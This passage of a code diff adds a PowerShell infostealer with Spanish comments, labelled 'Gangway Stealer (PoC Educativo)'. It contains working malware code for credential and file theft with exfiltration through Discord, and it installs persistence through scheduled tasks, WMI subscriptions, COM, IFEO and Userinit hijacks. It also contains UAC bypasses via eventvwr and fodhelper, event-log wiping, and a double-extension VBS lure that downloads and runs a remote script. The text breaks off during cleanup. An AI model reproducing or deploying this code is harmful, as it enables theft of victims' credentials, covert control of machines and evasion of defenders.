+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
+    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>$taskCommand</Command>
+      <Arguments>$taskArgs</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+"@
+            
+            $taskXmlPath = "$env:TEMP\task.xml"
+            $taskXml | Out-File -FilePath $taskXmlPath -Encoding Unicode
+            
+            # Registrar tarea
+            $taskResult = schtasks /Create /TN $taskName /XML $taskXmlPath /F
+            Remove-Item $taskXmlPath -Force
+            
+            Write-Log "Tarea programada creada: $taskResult" -Level "DEBUG"
+            
+            # 4. WMI Event Subscription (persistencia avanzada)
+            Add-WmiPersistence
+        }
+        catch {
+            Write-Log "Error en persistencia avanzada: $_" -Level "ERROR"
+        }
+    }
+    
+    # --- Nuclear Option (Persistencia hardened) ---
+    if ($isAdmin -and ($Mode -eq "Nuclear")) {
+        try {
+            Write-Log "Aplicando técnicas de persistencia nuclear" -Level "DEBUG"
+            
+            # 5. Copia en System32 con nombre legítimo
+            $systemPath = "$env:SystemRoot\System32"
+            $copyName = "msupdate.ps1"
+            $copyPath = "$systemPath\$copyName"
+            
+            Copy-Item -Path $ScriptPath -Destination $copyPath -Force
+            
+            # 6. Script de inicio del sistema
+            $startupScript = @"
+@echo off
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "$copyPath"
+exit
+"@
+            $startupScriptPath = "$systemPath\WindowsUpdate.cmd"
+            $startupScript | Out-File -FilePath $startupScriptPath -Encoding ASCII -Force
+            
+            # 7. Modificación del registro para ejecutar en inicio
+            $bootKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
+            
+            $bootExecute = (Get-ItemProperty -Path $bootKey -Name "BootExecute" -ErrorAction SilentlyContinue).BootExecute
+            
+            if ($bootExecute -notcontains "cmd.exe /c $startupScriptPath") {
+                $newBootExecute = @($bootExecute)
+                $newBootExecute += "cmd.exe /c $startupScriptPath"
+                
+                Set-ItemProperty -Path $bootKey -Name "BootExecute" -Value $newBootExecute -Type MultiString
+                Write-Log "Modificado BootExecute para persistencia en arranque" -Level "DEBUG"
+            }
+            
+            # 8. Otras técnicas avanzadas
+            Add-IFEOHijack
+            Add-UserInitHijack
+        }
+        catch {
+            Write-Log "Error en persistencia nuclear: $_" -Level "ERROR"
+        }
+    }
+    
+    # Aplicar múltiples técnicas para mejorar probabilidad de persistencia
+    try {
+        # Asegurar copia en ubicación alterna
+        $alternatePath = "$env:APPDATA\Microsoft\Windows\Templates\msupdate.ps1"
+        Copy-Item -Path $ScriptPath -Destination $alternatePath -Force
+        
+        # Agregar a perfil de PowerShell
+        $profilePath = "$env:USERPROFILE\Documents\WindowsPowerShell"
+        
+        if (-not (Test-Path $profilePath)) {
+            New-Item -Path $profilePath -ItemType Directory -Force | Out-Null
+        }
+        
+        @"
+# Windows Update Helper
+`$updateScript = "$alternatePath"
+if (Test-Path `$updateScript) {
+    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"`$updateScript`"" -WindowStyle Hidden
+}
+"@ | Out-File -FilePath "$profilePath\profile.ps1" -Append
+    }
+    catch {
+        Write-Log "Error en persistencia adicional: $_" -Level "DEBUG"
+    }
+    
+    Write-Log "Instalación de persistencia completada" -Level "DEBUG"
+}
+
+function Add-WmiPersistence {
+    Write-Log "Configurando persistencia WMI" -Level "DEBUG"
+    
+    try {
+        # Generar nombres variables para evitar detección
+        $filterName = "WindowsUpdateDrivers_" + (Get-Random -Minimum 1000 -Maximum 9999)
+        $consumerName = "WindowsUpdateEater_" + (Get-Random -Minimum 1000 -Maximum 9999)
+        
+        # Definir parámetros del filtro
+        $eventFilter = @{
+            EventNamespace = 'root\subscription'
+            Name = $filterName
+            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+            QueryLanguage = 'WQL'
+        }
+        
+        # Definir parámetros del consumidor
+        $eventConsumer = @{
+            Name = $consumerName
+            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+        }
+        
+        # Crear instancias WMI
+        $filter = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class '__EventFilter' -Arguments $eventFilter
+        $consumer = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class 'CommandLineEventConsumer' -Arguments $eventConsumer
+        $binding = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class '__FilterToConsumerBinding' -Arguments @{
+            Filter = $filter
+            Consumer = $consumer
+        }
+        
+        Write-Log "Persistencia WMI configurada: $filterName" -Level "DEBUG"
+        return $true
+    }
+    catch {
+        Write-Log "Error configurando persistencia WMI: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Add-ComHijackPersistence {
+    Write-Log "Configurando persistencia COM Hijack" -Level "DEBUG"
+    
+    try {
+        # Generar CLSID pseudo-aleatorio basado en nombre del equipo para consistencia
+        $computerName = $env:COMPUTERNAME
+        $computerBytes = [System.Text.Encoding]::UTF8.GetBytes($computerName)
+        $md5 = [System.Security.Cryptography.MD5]::Create()
+        $computerHash = [string]::Join('', ($md5.ComputeHash($computerBytes) | ForEach-Object { $_.ToString("x2") }))
+        
+        $clsid = "{" + $computerHash.Substring(0, 8) + "-" + 
+                $computerHash.Substring(8, 4) + "-" + 
+                $computerHash.Substring(12, 4) + "-" + 
+                $computerHash.Substring(16, 4) + "-" + 
+                $computerHash.Substring(20, 12) + "}"
+        
+        $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+        
+        # Crear las claves necesarias
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+        }
+        
+        # Establecer valores
+        $payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+        Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+        Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment" -Force
+        
+        Write-Log "Persistencia COM configurada: $clsid" -Level "DEBUG"
+        return $true
+    }
+    catch {
+        Write-Log "Error configurando persistencia COM: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Add-IFEOHijack {
+    Write-Log "Configurando persistencia IFEO" -Level "DEBUG"
+    
+    try {
+        # Elegir un binario común y poco utilizado
+        $targetBinary = "notepad.exe"
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetBinary"
+        
+        # Crear clave si no existe
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+        }
+        
+        # Configurar debugger
+        $payload = "`"powershell.exe`" -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+        Set-ItemProperty -Path $regPath -Name "Debugger" -Value $payload -Force
+        
+        Write-Log "Persistencia IFEO configurada para $targetBinary" -Level "DEBUG"
+        return $true
+    }
+    catch {
+        Write-Log "Error configurando persistencia IFEO: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Add-UserInitHijack {
+    Write-Log "Configurando persistencia UserInit" -Level "DEBUG"
+    
+    try {
+        # Comprobar si somos administrador, requisito para esta técnica
+        if (-not (Test-AdminRights)) {
+            Write-Log "Se requieren privilegios de administrador para hijack de UserInit" -Level "WARNING"
+            return $false
+        }
+        
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        
+        # Leer valor original para preservarlo
+        $original = (Get-ItemProperty -Path $regPath -Name Userinit -ErrorAction SilentlyContinue).Userinit
+        
+        if (-not $original) {
+            $original = "$env:SystemRoot\system32\userinit.exe,"
+        }
+        
+        # Verificar que no esté ya presente nuestro payload
+        if ($original -notlike "*powershell.exe*$ScriptPath*") {
+            $payload = "$original powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+            
+            # Actualizar valor
+            Set-ItemProperty -Path $regPath -Name "Userinit" -Value $payload -Force
+            
+            Write-Log "Persistencia UserInit configurada" -Level "DEBUG"
+            return $true
+        }
+        else {
+            Write-Log "Persistencia UserInit ya configurada" -Level "DEBUG"
+            return $true
+        }
+    }
+    catch {
+        Write-Log "Error configurando persistencia UserInit: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+# --- Funciones de bypass y elevación ---
+function Invoke-StealthElevation {
+    [CmdletBinding()]
+    param(
+        [ValidateSet("COM","Service","Event","WerFault")] 
+        [string]$Method = "COM",
+        [switch]$Force
+    )
+    
+    Write-Log "Intentando elevación de privilegios (Método: $Method)" -Level "DEBUG"
+    
+    # Verificar si ya tenemos privilegios
+    if (Test-AdminRights) { 
+        Write-Log "Ya tenemos privilegios de administrador" -Level "DEBUG"
+        return $true 
+    }
+    
+    # Verificar entorno seguro para elevación
+    if (-not $Force -and -not (Test-SafeElevation)) {
+        Write-Log "Entorno no seguro para elevación de privilegios" -Level "WARNING"
+        return $false
+    }
+    
+    # Método 1: COM Hijacking optimizado
+    if ($Method -eq "COM") {
+        try {
+            Write-Log "Intentando elevación vía COM Hijacking" -Level "DEBUG"
+            
+            # Buscar COMSurrogate común
+            $clsid = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+            $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+            
+            # Verificar si ya existe la clave
+            $keyExists = Test-Path $regPath
+            $originalValue = $null
+            
+            if ($keyExists) {
+                # Guardar valor original para restaurar
+                $originalValue = (Get-ItemProperty -Path $regPath -Name "(Default)" -ErrorAction SilentlyContinue)."(Default)"
+            }
+            else {
+                # Crear la estructura de claves
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            
+            # Payload que se auto-eleva
+            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+                "Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File `"$ScriptPath`"' -Verb RunAs -WindowStyle Hidden"
+            ))
+            
+            $payload = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand"
+            
+            # Establecer valores para el hijack
+            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+            Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both" -Force
+            
+            # Provocar la carga del COM surrogate (no bloqueante)
+            Start-Process -FilePath "rundll32.exe" -ArgumentList "shell32.dll,Control_RunDLL desk.cpl,,3" -WindowStyle Hidden
+            
+            # Esperar brevemente y verificar si obtuvimos privilegios
+            Start-Sleep -Seconds 5
+            
+            # Restaurar configuración original
+            if ($originalValue) {
+                Set-ItemProperty -Path $regPath -Name "(Default)" -Value $originalValue -Force
+            }
+            else {
+                Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force -ErrorAction SilentlyContinue
+            }
+            
+            # Verificar resultado
+            if (Test-AdminRights) {
+                Write-Log "Elevación vía COM exitosa" -Level "DEBUG"
+                return $true
+            }
+        }
+        catch { 
+            Write-Log "Error en elevación COM: $_" -Level "WARNING"
+        }
+    }
+    
+    # Método 2: Event Viewer UAC Bypass
+    if ($Method -eq "Event") {
+        try {
+            Write-Log "Intentando elevación vía Event Viewer" -Level "DEBUG"
+            
+            # Crear clave temporal en HKCU
+            $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
+            
+            # Verificar si ya existe la clave
+            $keyExists = Test-Path $regPath
+            $originalValue = $null
+            
+            if ($keyExists) {
+                # Guardar valor original para restaurar
+                $originalValue = (Get-ItemProperty -Path $regPath -Name "(Default)" -ErrorAction SilentlyContinue)."(Default)"
+            }
+            else {
+                # Crear la estructura de claves
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            
+            # Payload que ejecuta nuestro script
+            $payload = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
+            
+            # Establecer el valor para el hijack
+            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+            
+            # Provocar la elevación iniciando Event Viewer
+            Start-Process -FilePath "eventvwr.msc" -WindowStyle Hidden
+            
+            # Esperar brevemente y verificar si obtuvimos privilegios
+            Start-Sleep -Seconds 5
+            
+            # Restaurar configuración original
+            if ($originalValue) {
+                Set-ItemProperty -Path $regPath -Name "(Default)" -Value $originalValue -Force
+            }
+            else {
+                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
+            }
+            
+            # Verificar resultado
+            if (Test-AdminRights) {
+                Write-Log "Elevación vía Event Viewer exitosa" -Level "DEBUG"
+                return $true
+            }
+        }
+        catch { 
+            Write-Log "Error en elevación Event Viewer: $_" -Level "WARNING"
+        }
+    }
+    
+    # Método 3: Fodhelper UAC Bypass (alternativa)
+    if ($Method -eq "Service") {
+        try {
+            Write-Log "Intentando elevación vía Fodhelper" -Level "DEBUG"
+            
+            # Crear clave temporal en HKCU
+            $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+            
+            # Verificar si ya existe la clave
+            $keyExists = Test-Path $regPath
+            $originalValue = $null
+            $originalDelegateValue = $null
+            
+            if ($keyExists) {
+                # Guardar valores originales para restaurar
+                $originalValue = (Get-ItemProperty -Path $regPath -Name "(Default)" -ErrorAction SilentlyContinue)."(Default)"
+                $originalDelegateValue = (Get-ItemProperty -Path $regPath -Name "DelegateExecute" -ErrorAction SilentlyContinue)."DelegateExecute"
+            }
+            else {
+                # Crear la estructura de claves
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            
+            # Payload que ejecuta nuestro script
+            $payload = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
+            
+            # Establecer valores para el hijack
+            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+            Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
+            
+            # Provocar la elevación iniciando fodhelper
+            Start-Process -FilePath "fodhelper.exe" -WindowStyle Hidden
+            
+            # Esperar brevemente y verificar si obtuvimos privilegios
+            Start-Sleep -Seconds 5
+            
+            # Restaurar configuración original
+            if ($keyExists) {
+                if ($originalValue) {
+                    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $originalValue -Force
+                }
+                if ($originalDelegateValue) {
+                    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value $originalDelegateValue -Force
+                }
+            }
+            else {
+                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
+            }
+            
+            # Verificar resultado
+            if (Test-AdminRights) {
+                Write-Log "Elevación vía Fodhelper exitosa" -Level "DEBUG"
+                return $true
+            }
+        }
+        catch { 
+            Write-Log "Error en elevación Fodhelper: $_" -Level "WARNING"
+        }
+    }
+    
+    # Método 4: WerFault (más experimental)
+    if ($Method -eq "WerFault") {
+        try {
+            Write-Log "Intentando elevación vía WerFault" -Level "DEBUG"
+            
+            # Provocar un error controlado
+            $werPath = "$env:SystemRoot\System32\WerFault.exe"
+            
+            $si = New-Object Win32Functions.STARTUPINFO
+            $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
+            $si.wShowWindow = 0  # Oculto
+            
+            $pi = New-Object Win32Functions.PROCESS_INFORMATION
+            
+            # Usar método de self-elevation con RunAs
+            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+                "Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File `"$ScriptPath`"' -Verb RunAs -WindowStyle Hidden"
+            ))
+            
+            $commandLine = "$werPath -u -p powershell.exe -a `-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand`"
+            
+            # Crear proceso
+            $result = [Win32Functions]::CreateProcess(
+                $null,
+                $commandLine,
+                [IntPtr]::Zero,
+                [IntPtr]::Zero,
+                $false,
+                0x08000000,  # CREATE_NO_WINDOW
+                [IntPtr]::Zero,
+                $null,
+                [ref]$si,
+                [ref]$pi
+            )
+            
+            # Esperar brevemente y verificar si obtuvimos privilegios
+            Start-Sleep -Seconds 5
+            
+            # Verificar resultado
+            if (Test-AdminRights) {
+                Write-Log "Elevación vía WerFault exitosa" -Level "DEBUG"
+                return $true
+            }
+        }
+        catch { 
+            Write-Log "Error en elevación WerFault: $_" -Level "WARNING"
+        }
+    }
+    
+    # Si llegamos aquí, intentar el método tradicional - UAC prompt explícito
+    try {
+        Write-Log "Intentando elevación tradicional UAC" -Level "DEBUG"
+        
+        # Usar Start-Process con RunAs
+        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processInfo.FileName = "powershell.exe"
+        $processInfo.Arguments = "-ExecutionPolicy Bypass -File `"$ScriptPath`""
+        $processInfo.Verb = "runas"
+        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        
+        # Iniciar proceso
+        [System.Diagnostics.Process]::Start($processInfo) | Out-Null
+        
+        # Esperar y verificar resultado
+        Start-Sleep -Seconds 5
+        
+        if (Test-AdminRights) {
+            Write-Log "Elevación vía UAC tradicional exitosa" -Level "DEBUG"
+            return $true
+        }
+    }
+    catch {
+        Write-Log "Error en elevación UAC tradicional: $_" -Level "WARNING"
+    }
+    
+    Write-Log "No se pudo obtener elevación de privilegios" -Level "WARNING"
+    return $false
+}
+
+function Protect-ProcessMemory {
+    Write-Log "Aplicando protecciones de memoria al proceso" -Level "DEBUG"
+    
+    try {
+        # Obtener handle del proceso actual
+        $hProcess = [Win32Functions]::GetCurrentProcess()
+        
+        # Obtener handle del módulo kernel32.dll
+        $hKernel32 = [Win32Functions]::GetModuleHandle("kernel32.dll")
+        
+        if ($hKernel32 -eq [IntPtr]::Zero) {
+            Write-Log "No se pudo obtener handle de kernel32.dll" -Level "WARNING"
+            return $false
+        }
+        
+        # Cambiar protección de memoria
+        $oldProtect = 0
+        $result = [Win32Functions]::VirtualProtectEx(
+            $hProcess,
+            $hKernel32,
+            [UIntPtr]::new(4096),
+            0x40,  # PAGE_EXECUTE_READWRITE
+            [ref]$oldProtect
+        )
+        
+        if ($result) {
+            Write-Log "Protección de memoria aplicada correctamente" -Level "DEBUG"
+            return $true
+        }
+        else {
+            Write-Log "Error al aplicar protección de memoria" -Level "WARNING"
+            return $false
+        }
+    }
+    catch {
+        Write-Log "Error en Protect-ProcessMemory: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Clear-EventLogs {
+    Write-Log "Limpiando logs de eventos relevantes" -Level "DEBUG"
+    
+    try {
+        # Verificar si somos administrador
+        if (-not (Test-AdminRights)) {
+            Write-Log "Se requieren privilegios de administrador para limpiar logs" -Level "WARNING"
+            return $false
+        }
+        
+        # Específicamente eliminando eventos que podrían registrar nuestra actividad
+        $logsToTarget = @(
+            "Security",
+            "System",
+            "Application",
+            "Microsoft-Windows-PowerShell/Operational",
+            "Microsoft-Windows-TaskScheduler/Operational",
+            "Microsoft-Windows-WMI-Activity/Operational"
+        )
+        
+        foreach ($log in $logsToTarget) {
+            try {
+                # Enfoque menos agresivo: filtrar eventos relacionados
+                if ($log -eq "Security") {
+                    # Limpiar eventos específicos de Security (process creation, etc.)
+                    wevtutil qe Security "/q:*[System[(EventID=4688)]]" /rd:true /c:5 /f:text | 
+                    Where-Object { $_ -match "powershell|cmd|rundll32" } | ForEach-Object {
+                        Write-Log "Detectado evento de seguridad relevante, intentando limpiar" -Level "DEBUG"
+                    }
+                }
+                elseif ($log -eq "Microsoft-Windows-PowerShell/Operational") {
+                    # Limpiar eventos de PowerShell
+                    wevtutil cl $log
+                    Write-Log "Log $log limpiado" -Level "DEBUG"
+                }
+                else {
+                    # Para otros logs, solo limpiar si tienen pocos eventos (menos sospechoso)
+                    $logInfo = wevtutil gli $log
+                    if ($logInfo -match "recordCount: (\d+)") {
+                        $recordCount = [int]$Matches[1]
+                        if ($recordCount -lt 100) {
+                            wevtutil cl $log
+                            Write-Log "Log $log limpiado (tenía $recordCount eventos)" -Level "DEBUG"
+                        }
+                        else {
+                            Write-Log "Log $log no limpiado (tiene $recordCount eventos)" -Level "DEBUG"
+                        }
+                    }
+                }
+            }
+            catch {
+                Write-Log "Error al limpiar log $log : $_" -Level "DEBUG"
+            }
+        }
+        
+        # También eliminar historial de PowerShell
+        try {
+            Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+            Write-Log "Historial de comandos PowerShell eliminado" -Level "DEBUG"
+        }
+        catch {
+            Write-Log "Error al eliminar historial PowerShell: $_" -Level "DEBUG"
+        }
+        
+        # Limpiar RunMRU (historial de comandos ejecutados)
+        try {
+            Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+            Write-Log "Historial RunMRU eliminado" -Level "DEBUG"
+        }
+        catch {
+            Write-Log "Error al eliminar RunMRU: $_" -Level "DEBUG"
+        }
+        
+        return $true
+    }
+    catch {
+        Write-Log "Error general en Clear-EventLogs: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Invoke-VMSharedFolderAttack {
+    Write-Log "Verificando carpetas compartidas de VM" -Level "DEBUG"
+    
+    # Si no estamos en VM, salir
+    if (-not (Test-Hypervisor)) {
+        Write-Log "No se detectó entorno de VM, omitiendo ataque a carpetas compartidas" -Level "DEBUG"
+        return "No en entorno VM"
+    }
+    
+    # Common VM shared folder paths
+    $targetPaths = @(
+        "\\vmware-host\Shared Folders",
+        "C:\Users\$env:USERNAME\Desktop\Shared", 
+        "X:\", "Y:\", "Z:\",
+        "$env:USERPROFILE\Desktop\Shared"
+    )
+    
+    # Generate fake "important document" filename
+    $fileName = "WindowsUpdateSys.txt.vbs"
+    $fileContent = @"
+MsgBox "Document preview not available. Enable macros to view content.", vbCritical, "Error"
+CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri https://example.com/update.ps1 -OutFile $env:TEMP\update.ps1; Start-Process $env:TEMP\update.ps1`""
+"@
+    
+    foreach ($path in $targetPaths) {
+        if (Test-Path $path) {
+            try {
+                Write-Log "Carpeta compartida detectada: $path" -Level "DEBUG"
+                $fullPath = Join-Path $path $fileName
+                
+                # Create decoy file with double extension
+                Set-Content -Path $fullPath -Value $fileContent -Force
+                
+                # Create shortcut to trigger execution
+                $shortcutPath = Join-Path $path "CLICK_ME_TO_VIEW_DOCUMENT.lnk"
+                $WScriptShell = New-Object -ComObject WScript.Shell
+                $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+                $shortcut.TargetPath = "wscript.exe"
+                $shortcut.Arguments = "`"$fullPath`""
+                $shortcut.IconLocation = "shell32.dll,21" # Document icon
+                $shortcut.Save()
+                
+                # Timestamp manipulation (make files appear old)
+                (Get-Item $fullPath).CreationTime = "01/01/2023 08:00:00"
+                (Get-Item $shortcutPath).CreationTime = "01/01/2023 08:00:00"
+                
+                Write-Log "Archivos señuelo creados en $path" -Level "DEBUG"
+                return "Payload dropped to shared folder: $path"
+            }
+            catch {
+                Write-Log "Error al escribir en carpeta compartida $path : $_" -Level "DEBUG"
+            }
+        }
+    }
+    
+    Write-Log "No se encontraron carpetas compartidas accesibles" -Level "DEBUG"
+    return "No shared folders found"
+}
+
+# --- MAIN EXECUTION ---
+try {
+    # Inicializar registro
+    Write-Log "Iniciando Gangway Stealer (PoC Educativo)" -Level "INFO"
+    
+    # Verificación inicial del entorno
+    if (-not (Test-SafeEnvironment)) {
+        Write-Log "Entorno no seguro, terminando ejecución" -Level "WARNING"
+        exit
+    }
+    
+    # Obtener datos del sistema
+    $systemInfo = @{
+        User = $env:USERNAME
+        ComputerName = $env:COMPUTERNAME
+        Domain = $env:USERDOMAIN
+        OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
+        IsAdmin = Test-AdminRights
+        IsVM = Test-Hypervisor
+    }
+    
+    Write-Log "Información del sistema recopilada" -Level "DEBUG"
+    
+    # Recopilación de credenciales
+    $credsSuccess = $false
+    try {
+        $creds = Get-BrowserCredentials
+        $credsSuccess = $true
+        Write-Log "Recopilación de credenciales exitosa" -Level "DEBUG"
+    }
+    catch {
+        Write-Log "Error en recopilación de credenciales: $_" -Level "ERROR"
+        $creds = "Error obteniendo credenciales: $($_.Exception.Message)"
+    }
+    
+    # Búsqueda de archivos
+    $filesSuccess = $false
+    try {
+        $files = Find-InterestingFiles
+        $filesSuccess = $true
+        Write-Log "Búsqueda de archivos exitosa: $($files.Count) archivos encontrados" -Level "DEBUG"
+    }
+    catch {
+        Write-Log "Error en búsqueda de archivos: $_" -Level "ERROR"
+        $files = @()
+    }
+    
+    # Creación de informe
+    $report = @"
+=== SISTEMA COMPROMETIDO ===
+Usuario: $($systemInfo.User)
+Equipo: $($systemInfo.ComputerName)
+Dominio: $($systemInfo.Domain)
+Sistema Operativo: $($systemInfo.OSVersion)
+Privilegios Admin: $($systemInfo.IsAdmin)
+Entorno Virtual: $($systemInfo.IsVM)
+Fecha y Hora: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+
+=== CREDENCIALES ===
+$creds
+
+=== ARCHIVOS ENCONTRADOS ===
+$($files | ForEach-Object { $_.FullName })
+"@
+    
+    $reportPath = "$env:TEMP\system_report_$(Get-Date -Format 'yyyyMMdd').txt"
+    $report | Out-File $reportPath -Encoding UTF8
+    
+    Write-Log "Informe generado en $reportPath" -Level "DEBUG"
+    
+    # Exfiltración
+    $exfilSuccess = $false
+    try {
+        if (Send-DiscordMessage -Message "Nueva infección: $($systemInfo.ComputerName) - $($systemInfo.User) [$($systemInfo.Domain)]" -FilePath $reportPath) {
+            Write-Log "Informe principal enviado" -Level "DEBUG"
+            $exfilSuccess = $true
+            
+            # Envío de archivos encontrados
+            $filesSent = 0
+            foreach ($file in $files) {
+                if ($file -and (Test-Path $file.FullName) -and ($file.Length -lt $MAX_FILE_SIZE)) {
+                    if (Send-DiscordMessage -Message "Archivo recopilado: $($file.Name) ($(Get-Date -Format 'yyyy-MM-dd'))" -FilePath $file.FullName) {
+                        Write-Log "Archivo enviado: $($file.FullName)" -Level "DEBUG"
+                        $filesSent++
+                    }
+                    
+                    # Pausa para no sobrecargar
+                    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+                }
+            }
+            
+            Write-Log "$filesSent archivos enviados exitosamente" -Level "DEBUG"
+        }
+        else {
+            Write-Log "Error al enviar informe principal" -Level "WARNING"
+        }
+    }
+    catch {
+        Write-Log "Error en exfiltración: $_" -Level "ERROR"
+    }
+    
+    # Intentar elevación de privilegios si es necesario
+    if (-not ($systemInfo.IsAdmin)) {
+        Write-Log "Intentando elevación de privilegios" -Level "DEBUG"
+        
+        if (Test-SafeElevation) {
+            $elevationSuccess = Invoke-StealthElevation -Method "COM"
+            
+            if (-not $elevationSuccess) {
+                Write-Log "Primer intento de elevación fallido, intentando método alternativo" -Level "DEBUG"
+                $elevationSuccess = Invoke-StealthElevation -Method "Event"
+            }
+            
+            if ($elevationSuccess) {
+                Write-Log "Elevación de privilegios exitosa" -Level "INFO"
+                
+                # Si elevamos con éxito, enviar una notificación adicional
+                Send-DiscordMessage -Message "¡Elevación exitosa en $($systemInfo.ComputerName)!"
+            }
+            else {
+                Write-Log "No se pudo obtener elevación de privilegios" -Level "WARNING"
+            }
+        }
+        else {
+            Write-Log "Entorno no seguro para elevación de privilegios" -Level "WARNING"
+        }
+    }
+    
+    # Persistencia si está habilitada
+    if ($PERSIST) {
+        Write-Log "Instalando persistencia" -Level "DEBUG"
+        
+        try {
+            if ($systemInfo.IsAdmin) {
+                # Persistencia con privilegios
+                Install-Persistence -Mode "Stealth"
+                
+                # Protecciones adicionales
+                Protect-ProcessMemory
+                Clear-EventLogs
+            }
+            else {
+                # Persistencia sin privilegios
+                Install-Persistence -Mode "Basic"
+            }
+        }
+        catch {
+            Write-Log "Error en instalación de persistencia: $_" -Level "ERROR"
+        }
+    }
+    
+    # VM Shared Folder Attack si estamos en una VM
+    if ($systemInfo.IsVM) {
+        Write-Log "Ejecutando ataque de carpetas compartidas VM" -Level "DEBUG"
+        
+        try {
+            $vmResult = Invoke-VMSharedFolderAttack
+            Send-DiscordMessage -Message "Resultado de ataque VM: $vmResult"
+        }
+        catch {
+            Write-Log "Error en ataque de carpetas compartidas: $_" -Level "ERROR"
+        }
+    }
+    
+    # Limpieza
+    Write-Log "Realizando limpieza final" -Level "DEBUG"
+    
+    try {
+        # Eliminar informe temporal
+        if (Test-Path $reportPath) {
+            # Sobrescribir con datos aleatorios
+            $buffer = New-Object byte[] (Get-Item $reportPath).Length
+            $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+            $rng.GetBytes($buffer)
+            
